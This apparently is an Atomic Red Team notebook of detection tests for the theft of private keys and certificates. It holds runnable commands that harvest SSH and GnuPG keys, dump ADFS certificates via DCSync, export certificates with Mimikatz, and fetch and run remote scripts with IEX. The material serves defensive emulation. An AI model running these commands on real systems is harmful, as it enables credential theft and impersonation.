{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "876445d1",
   "metadata": {},
   "source": "# T1552.004 - Private Keys\nAdversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)\n\nOn network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) \n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email."
  },
  {
   "cell_type": "markdown",
   "id": "cf33f456",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "c7b3823c",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Private Keys",
    "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ndir c:\\ /b /s .key | findstr /e .key\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5154bee2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "4c26f4cc",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Discover Private SSH Keys",
    "Discover private SSH keys on a FreeBSD, macOS or Linux system.\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nfind / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt\nexit 0\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f5f599e0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "483aee8b",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm /tmp/keyfile_locations.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "79dbdeec",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c4cd49b1",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Copy Private SSH Keys with CP",
    "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nmkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \\;\nexit 0\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7935aca6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "cb554a16",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf /tmp/art-staging\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "000f4224",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4177ab25",
   "metadata": {},
   "source": "### Atomic Test #4 - Copy Private SSH Keys with CP (freebsd)\nCopy private SSH keys on a FreeBSD system to a staging folder using the `cp` command.\n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `sh`!\n##### Description: Install GNU cp from coreutils package.\n\n##### Check Prereq Commands:\n```sh\nif [ ! -x \"$(command -v gcp)\" ]; then exit 1; else exit 0; fi;\n\n```\n##### Get Prereq Commands:\n```sh\n(which pkg && pkg install -y coreutils)\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4edc0806",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "def1b1d5",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nmkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec gcp --parents {} /tmp/art-staging \\;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0149d45f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "1a8683a9",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf /tmp/art-staging\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f931302",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1400eb3e",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Copy Private SSH Keys with rsync",
    "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n",
    "**Supported Platforms:** macos, linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nmkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \\;\nexit 0\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "99176cc2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "97050eb1",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf /tmp/art-staging\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aa1f5ce1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6e213815",
   "metadata": {},
   "source": "### Atomic Test #6 - Copy Private SSH Keys with rsync (freebsd)\nCopy private SSH keys on a FreeBSD system to a staging folder using the `rsync` command.\n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `sh`!\n##### Description: Check if rsync is installed.\n\n##### Check Prereq Commands:\n```sh\nif [ ! -x \"$(command -v rsync)\" ]; then exit 1; else exit 0; fi;\n\n```\n##### Get Prereq Commands:\n```sh\n(which pkg && pkg install -y rsync)\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6d9a687a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "fbfbf05e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nmkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \\;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d22f8ff2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "abd77b4a",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf /tmp/art-staging\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7db3c17f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ce326b77",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Copy the users GnuPG directory with rsync",
    "Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.\n",
    "**Supported Platforms:** macos, linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nmkdir /tmp/GnuPG\nfind / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \\;\nexit 0\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1313cf25",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "fad673e0",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf /tmp/GnuPG\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eca8ce3f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2ff5fdcd",
   "metadata": {},
   "source": "### Atomic Test #8 - Copy the users GnuPG directory with rsync (freebsd)\nCopy the users GnuPG (.gnupg) directory on a FreeBSD system to a staging folder using the `rsync` command.\n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `sh`!\n##### Description: Check if rsync is installed.\n\n##### Check Prereq Commands:\n```sh\nif [ ! -x \"$(command -v rsync)\" ]; then exit 1; else exit 0; fi;\n\n```\n##### Get Prereq Commands:\n```sh\n(which pkg && pkg install -y rsync)\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d70cee2f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6651f61f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nmkdir /tmp/GnuPG\nfind / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \\;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "04907dde",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "82aa2d2e",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf /tmp/GnuPG\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3755dce6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d4ddaea4",
   "metadata": {},
   "source": "### Atomic Test #9 - ADFS token signing and encryption certificates theft - Local\nRetrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AADInternals module must be installed.\n\n##### Check Prereq Commands:\n```powershell\nif (Get-Module AADInternals) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AADInternals -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e95c05b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "220e4b4d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8ec1e094",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "db2cd176",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "390ba16f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e9699ac5",
   "metadata": {},
   "source": "### Atomic Test #10 - ADFS token signing and encryption certificates theft - Remote\nRetrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AADInternals and ActiveDirectory modules must be installed.\n\n##### Check Prereq Commands:\n```powershell\nif ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AADInternals -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "550af473",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a8def3cd",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "970f30c3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "2a4913e6",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fc3ead49",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e0f3edea",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - CertUtil ExportPFX",
    "The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\nReference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nIEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\\temp\\atomic.pfx\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0d0bf1b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "e3e349ea",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nGet-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7e6ca2d1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 11 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e7eaa478",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - Export Root Certificate with Export-PFXCertificate",
    "Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$mypwd = ConvertTo-SecureString -String \"AtomicRedTeam\" -Force -AsPlainText\n$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nGet-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath $env:Temp\\atomicredteam.pfx -Password $mypwd\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a8fce1e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "166160c6",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ntry {\n$cert = Import-Certificate -FilePath $env:Temp\\atomicredteam.pfx -CertStoreLocation Cert:\\LocalMachine\\My\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\nGet-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n} catch { }\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e80be562",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "704e3c51",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - Export Root Certificate with Export-Certificate",
    "Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath $env:Temp\\AtomicRedTeam.cer\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f4d48d1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "72c93aaa",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ntry {\n   $cert = Import-Certificate -FilePath $env:Temp\\AtomicRedTeam.cer -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n}\ncatch { }\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2b365bb9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 13 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d252d8c9",
   "metadata": {},
   "source": "### Atomic Test #14 - Export Certificates with Mimikatz\nThe following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\nA successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "292836d9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 14 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "627f751f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\" \"crypto::certificates /systemstore:local_machine /store:my /export\"  exit\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "681e5549",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "efefc6be",
   "metadata": {},
   "source": "## Detection\nMonitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication. For network infrastructure devices, collect AAA logging to monitor for private keys being exported."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}